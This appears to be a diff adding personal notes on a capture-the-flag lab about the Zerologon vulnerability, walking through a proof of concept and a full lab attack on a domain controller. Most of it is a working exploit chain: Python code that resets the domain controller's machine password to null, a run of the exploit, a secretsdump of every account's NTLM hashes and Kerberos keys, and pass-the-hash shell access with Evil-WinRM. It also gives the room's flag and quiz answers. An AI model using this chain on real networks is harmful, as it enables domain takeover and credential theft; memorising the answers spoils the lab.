@@ -270,3 +270,275 @@ server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_
 Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).
 Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the Microsoft Documentation:
 NTSTATUS NetrServerReqChallenge(
+[in, unique, string] LOGONSRV_HANDLE PrimaryName,
+[in, string] wchar_t* ComputerName,
+[in] PNETLOGON_CREDENTIAL ClientChallenge,
+);
+The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of "\x00".
+And the client will receive back, which will be used in Figure 1, Step 2:
+NTSTATUS NetrServerReqChallenge(
+[out] PNETLOGON_CREDENTIAL ServerChallenge
+);
+Lines 8 sets up a try except (we'll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:
+NTSTATUS NetrServerAuthenticate3(
+[in, unique, string] LOGONSRV_HANDLE PrimaryName,
+[in, string] wchar_t* AccountName,
+[in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+[in, string] wchar_t* ComputerName,
+[in] PNETLOGON_CREDENTIAL ClientCredential,
+[in, out] ULONG * NegotiateFlags,
+);
+On line 9, we supply the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of "\x00" attempting to Abuse Zero Logon, remember there's 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.
+NTSTATUS NetrServerAuthenticate3(
+[out] PNETLOGON_CREDENTIAL ServerCredential,
+[in, out] ULONG * NegotiateFlags,
+[out] ULONG * AccountRid
+);
+Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.
+Line 44 - 54
+assert server_auth['ErrorCode'] == 0
+return rpc_con
+except nrpc.DCERPCSessionError as ex:
+if ex.get_error_code() == 0xc0000022:
+return None
+else:
+fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
+except BaseException as ex:
+fail(f'Unexpected error: {ex}.')
+Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we're going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn't break and exit after receiving an error back.
+End of Transmission, What's Next? -
+And that's all there is to the Proof of Concept. It's not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us -- but it stops and doesn't do anything further, so how do we proceed?
+Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you're not familiar with NRPC, and you're not that technical of an individual, look back at the last step in Task 1, Figure 3 (hint: It tells us what we need to do).
+What's It All Mean, Doc? -
+After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over RDP, you should have came across the following document:
+https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81
+The document outlines what information is required to change a password over NRPC. The following information is required to do so:
+NTSTATUS NetrServerPasswordSet2(
+[in, unique, string] LOGONSRV_HANDLE PrimaryName,
+[in, string] wchar_t* AccountName,
+[in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+[in, string] wchar_t* ComputerName,
+[in] PNETLOGON_AUTHENTICATOR Authenticator,
+[in] PNL_TRUST_PASSWORD ClearNewPassword
+);
+Going back and looking at NetrServerAuthenticate3 and NetrServerPasswordSet2, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the Authenticator first:
+typedef struct _NETLOGON_AUTHENTICATOR {
+NETLOGON_CREDENTIAL Credential;
+DWORD Timestamp;
+}
+And suddenly we've hit another unknown, NETLOGON_CREDENTIAL. Fortunately, Microsoft does have documentation for NETLOGON_CREDENTIAL as well:
+typedef struct _NETLOGON_CREDENTIAL {
+CHAR data[8];
+} NETLOGON_CREDENTIAL,
+*PNETLOGON_CREDENTIAL;
+Per the documentation, NETLOGON_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that "the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation", fortunately we know this value, thanks to Zero Logon, it's 8 bytes of Zero. In terms of the Timestamp, it's a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me.
+In order to change the password the Microsoft Documentation states that:
+The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes.
+For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we're setting it to a null value now.
+Level Up -
+Now that we know the required arguments to change the password via NRPC, we actually have to implement it in Python. We need to take a look at the nrpc.py module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:
+def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):
+request = NetrServerPasswordSet2()
+request['PrimaryName'] = checkNullString(primaryName)
+request['AccountName'] = checkNullString(accountName)
+request['SecureChannelType'] = secureChannelType
+request['ComputerName'] = checkNullString(computerName)
+request['Authenticator'] = authenticator
+request['ClearNewPassword'] = clearNewPasswordBlob
+return dce.request(request)
+As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:
+class NETLOGON_AUTHENTICATOR(NDRSTRUCT):
+structure = (
+('Credential', NETLOGON_CREDENTIAL),
+('Timestamp', DWORD),
+)
+The format here is a little bit different compared to the prior, but we'll adjust accordingly when we go to slot it into the PoC, but while we're talking about slotting it into the PoC, where will our added code go?
+Our added code will go immediately before "return rpc_con" on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we'll need to add to the PoC, we'll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.
+The Additional Code we're slotting in:
+newPassRequest = nrpc.NetrServerPasswordSet2()
+newPassRequest['PrimaryName'] = dc_handle + '\x00'
+newPassRequest['AccountName'] = target_computer + '$\x00'
+newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+auth = nrpc.NETLOGON_AUTHENTICATOR()
+auth['Credential'] = b'\x00' * 8
+auth['Timestamp'] = 0
+newPassRequest['Authenticator'] = auth
+newPassRequest['ComputerName'] = target_computer + '\x00'
+newPassRequest['ClearNewPassword'] =  b'\x00' * 516
+rpc_con.request(newPassRequest)
+At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found here:
+https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py
+What method will allow us to change Passwords over NRPC?
+*NetrServerPasswordSet2*
+What are the required fields for the method per the Microsoft Documentation?
+*PrimaryName, AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator, ClearNewpassword*
+What Opnumber is the Method?
+*30*
+Modify the PoC *No answer needed* (If you're having difficulty, you can download the modified PoC from here: https://github.com/Sq00ky/Zero-Logon-Exploit)
+### Lab It Up!
+Lab It Up
+Time to Play -
+Now that you've learned about Zero Logon, it's time to put your new found skills to the test and exploit this vulnerable Domain Controller!
+Ctrl+Z -
+After you get done, if you want to play around some more, instead of terminating the machine, you can simply issue the following command to reset the machine back to it's original state:
+powershell.exe -c 'Reset-ComputerMachinePassword'
+If you're confused on how to issue the command, you can simply Pass The Local Admin Hash with Evil-WinRM to gain command execution. You can do so with the following command:
+`evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>`
+
+## Enumeration
+```text
+rustscan -a 10.10.212.36 --ulimit 5000 -b 65535 -- -A 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+
+3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HOLOLIVE
+|   NetBIOS_Domain_Name: HOLOLIVE
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: hololive.local
+|   DNS_Computer_Name: DC01.hololive.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-08-28T18:57:55+00:00
+```
+What is the NetBIOS name of the Domain Controller?
+*DC01*
+What is the NetBIOS domain name of the network?
+*HOLOLIVE*
+What domain are you attacking?
+*hololive.local*
+```text
+┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
+└─$ python3 zeroLogon-NullPass.py DC01 10.10.212.36           
+
+ _____                   __                         
+/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
+\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
+ / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
+/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
+                                  |___/             
+                Vulnerability Discovered by Tom Tervoort
+                              Exploit by Ronnie Bartwitz
+  
+Performing authentication attempts...
+Failure to Autheticate at attempt number: 444
+Zero Logon successfully exploited, changing password.
+```
+```text
+┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
+└─$ secretsdump.py -just-dc -no-pass DC01\$@10.10.212.36
+Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
+hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
+hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
+hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::
+hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::
+hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
+hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
+hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
+hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
+DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49
+Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1
+Administrator:des-cbc-md5:bf34685d383e6734
+krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583
+krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d
+krbtgt:des-cbc-md5:25f1cea1542f9e31
+hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763
+hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab
+hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1
+hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd
+hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350
+hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1
+hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04
+hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5
+hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe
+hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb
+hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53
+hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80
+hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287
+hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba
+hololive.local\koronei:des-cbc-md5:a737e6073d15aecd
+hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5
+hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a
+hololive.local\okayun:des-cbc-md5:10896d3786b9628f
+hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9
+hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc
+hololive.local\watamet:des-cbc-md5:bf622564a840f192
+hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233
+hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42
+hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1
+DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8
+DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8
+DC01$:des-cbc-md5:cd161923ab9ec11c
+[*] Cleaning up...
+```
+What is the Local Administrator's NTLM hash?
+*3f3ef89114fb063e3d7fc23c20f65568*
+How many Domain Admin accounts are there?
+*2* (All Domain Admin accounts are prefixed with A-)
+
+## Privilege Escalation
+```text
+┌──(impacketEnv)─(kali㉿kali)-[~/Downloads/zerologon_learning]
+└─$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.212.36
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine             
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                               
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+    Directory: C:\Users\Administrator
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/16/2020   4:52 PM                3D Objects
+d-r---        9/16/2020   4:52 PM                Contacts
+d-r---        10/7/2020   5:13 PM                Desktop
+d-r---        9/16/2020   4:52 PM                Documents
+d-r---        9/16/2020   4:52 PM                Downloads
+d-r---        9/16/2020   4:52 PM                Favorites
+d-r---        9/16/2020   4:52 PM                Links
+d-r---        9/16/2020   4:52 PM                Music
+d-r---        9/16/2020   4:52 PM                Pictures
+d-r---        9/16/2020   4:52 PM                Saved Games
+d-r---        9/16/2020   4:52 PM                Searches
+d-r---        9/16/2020   4:52 PM                Videos
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/20/2020   2:02 PM             24 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+THM{Zer0Log0nD4rkTh1rty}
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+```
+What is the root flag?
+
+## Flags / Answers
+- ***THM{Zer0Log0nD4rkTh1rty}***
+
+## Notes / Lessons Learned
+[[Intro to ISAC]]
+
